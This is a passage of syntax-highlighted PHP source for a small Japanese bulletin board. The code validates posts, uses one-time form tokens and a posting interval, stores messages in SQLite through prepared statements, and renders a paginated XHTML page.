    <span class="nv">$$v</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// ページ番号を1以上の整数になるように補正</span>
<span class="nv">$page</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$page</span><span class="p">);</span>

<span class="cm">/* セッションの初期化 */</span>
<span class="nb">session_name</span><span class="p">(</span><span class="nx">SESSION_NAME</span><span class="p">);</span> <span class="c1">// セッション名を設定</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>           <span class="c1">// セッション開始</span>
<span class="c1">// セッション変数を初期化</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_SESSION</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'name'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'text'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'token'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(),</span>
        <span class="s1">'prev'</span>  <span class="o">=&gt;</span> <span class="k">null</span><span class="p">,</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* PDOでの処理 */</span>
<span class="k">try</span> <span class="p">{</span>

    <span class="c1">// 接続</span>
    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="nx">DB_DSN</span><span class="p">);</span>
    <span class="c1">// プリペアドステートメントのエミュレーションを無効化</span>
    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_EMULATE_PREPARES</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
    <span class="c1">// SQL実行でエラーが発生したときに例外をスローするように設定</span>
    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">);</span>
    <span class="c1">// テーブルが未生成であれば生成する</span>
    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'CREATE TABLE IF NOT EXISTS'</span><span class="p">,</span>
        <span class="s1">'mini_board('</span><span class="p">,</span>
            <span class="nb">implode</span><span class="p">(</span><span class="s1">', '</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL'</span><span class="p">,</span>
                <span class="s1">'name TEXT NOT NULL'</span><span class="p">,</span>
                <span class="s1">'email TEXT NOT NULL'</span><span class="p">,</span>
                <span class="s1">'text TEXT NOT NULL'</span><span class="p">,</span>
                <span class="s1">'time TEXT NOT NULL'</span><span class="p">,</span>
            <span class="p">)),</span>
        <span class="s1">')'</span><span class="p">,</span>
    <span class="p">)));</span>
    <span class="c1">// 送信ボタンが押された場合</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$submit</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="c1">// セッション変数に書き込む情報をセット</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$email</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
            <span class="c1">// ワンタイムトークンが直近指定個に含まれていなければ弾く</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'フォームの有効期限が切れています。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// ワンタイムトークンを消費させる</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]);</span>
            <span class="c1">// 最後の投稿から指定秒経過していなければ弾く</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">]</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$diff</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">]</span> <span class="o">-</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">];</span>
                <span class="k">if</span> <span class="p">((</span><span class="nv">$limit</span> <span class="o">=</span> <span class="nx">LIMIT_SEC</span> <span class="o">-</span> <span class="nv">$diff</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s2">"投稿間隔が短すぎます。</span><span class="si">{</span><span class="nv">$limit</span><span class="si">}</span><span class="s2">秒ほどお待ちください。"</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="c1">// 名前をチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$len</span> <span class="o">&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'名前は30字以下で入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// Eメールアドレスをチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'有効なEメールアドレスを入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// 本文をチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$len</span> <span class="o">&gt;</span> <span class="mi">140</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'本文は140字以下で入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// 例外がここまでに1つでも発生していればスローする</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">// プリペアドステートメントを生成</span>
            <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'INSERT'</span><span class="p">,</span>
                <span class="s1">'INTO mini_board(`name`, `email`, `text`, `time`)'</span><span class="p">,</span>
                <span class="s1">'VALUES(?, ?, ?, ?)'</span><span class="p">,</span>
            <span class="p">)));</span>
            <span class="c1">// 書き込みを実行</span>
            <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
                <span class="nv">$name</span><span class="p">,</span>
                <span class="nv">$email</span><span class="p">,</span>
                <span class="nv">$text</span><span class="p">,</span>
                <span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">])</span>
            <span class="p">));</span>
            <span class="c1">// セッションに時間を記録し、メッセージをセット</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
            <span class="c1">// フォームの投稿内容をリセットする</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
            <span class="c1">// 正しい処理を行ったが、形式上例外としてスロー</span>
            <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'書き込みました'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// プリペアドステートメントを生成</span>
    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'SELECT'</span><span class="p">,</span>
        <span class="s1">'`name`, `email`, `text`, `time`'</span><span class="p">,</span>
        <span class="s1">'FROM mini_board'</span><span class="p">,</span>
        <span class="s1">'ORDER BY `id` DESC'</span><span class="p">,</span>
        <span class="s1">'LIMIT ?, ?'</span><span class="p">,</span>
    <span class="p">)));</span>
    <span class="c1">// 値をバインド</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nx">DISP_MAX</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nx">DISP_MAX</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
    <span class="c1">// 読み出しを実行</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
    <span class="c1">// ページ番号にあった分だけ取り出す</span>
    <span class="nv">$articles</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
    <span class="c1">// 現在のページの件数をセット</span>
    <span class="nv">$current_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$articles</span><span class="p">);</span>
    <span class="c1">// 総件数をセット</span>
    <span class="nv">$whole_count</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">'SELECT COUNT(*) FROM mini_board'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">fetchColumn</span><span class="p">();</span>
    <span class="c1">// 総ページ数をセット</span>
    <span class="nv">$page_count</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$whole_count</span> <span class="o">/</span> <span class="nx">DISP_MAX</span><span class="p">);</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>

<span class="cm">/* ワンタイムトークンを次の投稿のために準備 */</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="nv">$token</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">())</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">],</span>
    <span class="mi">0</span><span class="p">,</span>
    <span class="nx">TOKEN_MAX</span>
<span class="p">);</span>

<span class="cm">/* ヘッダー送信 */</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>ミニ掲示板<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">style</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/css"</span><span class="p">&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span>
    <span class="o">&lt;!</span><span class="nt">--</span>
    <span class="p">#</span><span class="nn">wrapper</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">header</span><span class="o">,</span> <span class="p">#</span><span class="nn">container</span><span class="o">,</span> <span class="p">#</span><span class="nn">footer</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">650</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span> <span class="kc">auto</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">header</span><span class="o">,</span> <span class="p">#</span><span class="nn">footer</span> <span class="p">{</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">messages</span><span class="o">,</span> <span class="p">#</span><span class="nn">textarea</span><span class="o">,</span> <span class="p">#</span><span class="nn">articles</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">550</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">-3</span><span class="kt">px</span> <span class="kc">auto</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">border-top</span><span class="p">:</span> <span class="mi">3</span><span class="kt">px</span> <span class="kc">double</span> <span class="kc">brown</span><span class="p">;</span>
      <span class="k">padding</span><span class="p">:</span> <span class="mi">28</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">#</span><span class="nn">articles</span> <span class="p">{</span> 
      <span class="k">overflow</span><span class="p">:</span> <span class="kc">hidden</span><span class="p">;</span>
      <span class="k">padding-top</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article</span> <span class="p">{</span>
      <span class="k">margin-top</span><span class="p">:</span> <span class="mi">-1</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">border-top</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">dotted</span> <span class="kc">brown</span><span class="p">;</span>
      <span class="k">padding</span><span class="p">:</span> <span class="mi">19</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_name</span> <span class="p">{</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">27</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_text</span> <span class="p">{</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">article_time</span> <span class="p">{</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">right</span><span class="p">;</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">11</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.</span><span class="nc">page</span> <span class="p">{</span>
      <span class="k">font-size</span><span class="p">:</span> <span class="mi">11</span><span class="kt">px</span><span class="p">;</span>
      <span class="k">text-align</span><span class="p">:</span> <span class="kc">right</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">body</span> <span class="p">{</span>
      <span class="k">background</span><span class="p">:</span> <span class="kc">antiquewhite</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">h1</span> <span class="p">{</span>
      <span class="k">color</span><span class="p">:</span> <span class="kc">fuchsia</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">textarea</span> <span class="p">{</span>
      <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
      <span class="k">height</span><span class="p">:</span> <span class="mi">150</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">label</span> <span class="p">{</span>
      <span class="k">display</span><span class="p">:</span> <span class="kc">block</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">--</span><span class="o">&gt;</span>
 <span class="o">]]&gt;</span><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"wrapper"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"header"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>～ミニ掲示板～<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"container"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"textarea"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>名前: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"name"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Eメール: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"email"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>本文<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">textarea</span> <span class="na">name</span><span class="o">=</span><span class="s">"text"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">textarea</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">style</span><span class="o">=</span><span class="s">"text-align:right;"</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">name</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"投稿"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"token"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$token</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"messages"</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nx">exception_to_array</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$msg</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$articles</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"articles"</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$articles</span> <span class="k">as</span> <span class="nv">$article</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_name"</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"mailto:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_text"</span><span class="p">&gt;&lt;</span><span class="nt">pre</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_time"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'time'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"footer"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?page=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$page</span><span class="o">-</span><span class="mi">1</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>前<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> | 
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?"</span><span class="p">&gt;</span>最新<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$page_count</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$page</span> <span class="o">&lt;</span> <span class="nv">$page_count</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
           | <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?page=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$page</span><span class="o">+</span><span class="mi">1</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>次<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"page"</span><span class="p">&gt;</span><span class="cp">&lt;?php</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$current_count</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'まだ書き込みはありません'</span><span class="p">;</span>
